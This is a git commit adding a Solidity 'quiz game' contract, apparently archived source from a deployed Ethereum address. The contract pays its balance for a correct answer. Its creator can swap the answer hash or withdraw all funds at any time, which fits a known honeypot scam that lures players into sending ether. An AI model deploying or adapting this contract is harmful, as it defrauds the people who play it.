44e26d9397e130be82af31ff25c8e8333a37bd7f
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 09:15:16 +0700

    add contract QUICK_QUIZ_GAME

---
+++ QUICK_QUIZ_GAME.sol
@@ -0,0 +1,55 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract QUICK_QUIZ_GAME at 0xe1ccB3A5BaE6FeCDB9B60c0ACF94989F48C10742
+*/
+pragma solidity ^0.4.20;
+
+contract QUICK_QUIZ_GAME
+{
+    function Play(string _response)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        if(responseHash == keccak256(_response) && msg.value>1 ether)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    string public question;
+ 
+    address questionSender;
+  
+    bytes32 responseHash;
+ 
+    function StartGame(string _question,string _response)
+    public
+    payable
+    {
+        if(responseHash==0x0)
+        {
+            responseHash = keccak256(_response);
+            question = _question;
+            questionSender = msg.sender;
+        }
+    }
+    
+    function StopGame()
+    public
+    payable
+    {
+       require(msg.sender==questionSender);
+       msg.sender.transfer(this.balance);
+    }
+    
+    function NewQuestion(string _question, bytes32 _responseHash)
+    public
+    payable
+    {
+        require(msg.sender==questionSender);
+        question = _question;
+        responseHash = _responseHash;
+    }
+    
+    function() public payable{}
+}
